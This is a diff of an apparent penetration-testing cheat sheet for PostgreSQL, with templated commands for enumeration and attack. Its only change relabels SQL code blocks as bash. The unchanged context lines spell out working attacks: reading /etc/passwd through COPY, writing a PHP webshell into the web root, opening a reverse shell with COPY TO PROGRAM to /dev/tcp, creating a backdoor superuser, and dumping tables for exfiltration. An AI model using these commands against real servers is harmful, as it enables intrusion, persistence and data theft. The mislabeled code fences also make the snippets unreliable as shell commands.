@@ -29,7 +29,7 @@ psql postgresql://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:54
 ## show server version
 Display server version for CVE matching.
 
-```sql
+```bash
 SHOW SERVER_VERSION;
 SELECT version();
 ```
@@ -41,7 +41,7 @@ SELECT version();
 ## list databases roles
 Enumerate databases and user roles on server.
 
-```sql
+```bash
 \l
 \du
 SELECT rolname FROM pg_roles;
@@ -54,7 +54,7 @@ SELECT rolname FROM pg_roles;
 ## list schemas tables
 Show schemas and tables in current database.
 
-```sql
+```bash
 \dn
 \dt
 SELECT schema_name FROM information_schema.schemata;
@@ -68,7 +68,7 @@ SELECT table_schema, table_name FROM information_schema.tables ORDER BY 1,2;
 ## describe table columns
 View column types and lengths.
 
-```sql
+```bash
 \d {{TABLE:str}}
 SELECT column_name, data_type, character_maximum_length FROM information_schema.columns WHERE table_name = '{{TABLE:str}}';
 ```
@@ -92,7 +92,7 @@ psql
 ## read file copy from
 Read arbitrary file from server filesystem.
 
-```sql
+```bash
 CREATE TABLE temp_table(content text);
 COPY temp_table FROM '/etc/passwd';
 SELECT * FROM temp_table;
@@ -106,7 +106,7 @@ DROP TABLE temp_table;
 ## write webshell copy to
 Write attacker-controlled content to server filesystem.
 
-```sql
+```bash
 COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/shell.php';
 ```
 
@@ -117,7 +117,7 @@ COPY (SELECT '<?php system($_GET[c]); ?>') TO '/var/www/html/shell.php';
 ## exec command copy program rce
 Execute OS commands through COPY TO PROGRAM (PostgreSQL 9.3+).
 
-```sql
+```bash
 COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}} 0>&1';
 ```
 
@@ -128,7 +128,7 @@ COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:4444}
 ## create superuser backdoor
 Create new superuser role for persistent access.
 
-```sql
+```bash
 CREATE USER {{USERNAME:str:backdoor}} WITH PASSWORD '{{PASSWORD:str:Pwn3d!}}' SUPERUSER;
 ```
 
@@ -139,7 +139,7 @@ CREATE USER {{USERNAME:str:backdoor}} WITH PASSWORD '{{PASSWORD:str:Pwn3d!}}' SU
 ## grant privileges database
 Grant connect/all privileges to a user on a database.
 
-```sql
+```bash
 GRANT ALL PRIVILEGES ON DATABASE {{DATABASE:str}} TO {{USERNAME:str}};
 GRANT SELECT, UPDATE, INSERT ON ALL TABLES IN SCHEMA public TO {{USERNAME:str}};
 ```
@@ -151,7 +151,7 @@ GRANT SELECT, UPDATE, INSERT ON ALL TABLES IN SCHEMA public TO {{USERNAME:str}};
 ## export table csv exfil
 Dump a table contents to CSV for exfil.
 
-```sql
+```bash
 \copy {{TABLE:str}} TO '{{OUTFILE:file:table.csv}}' CSV
 ```
 
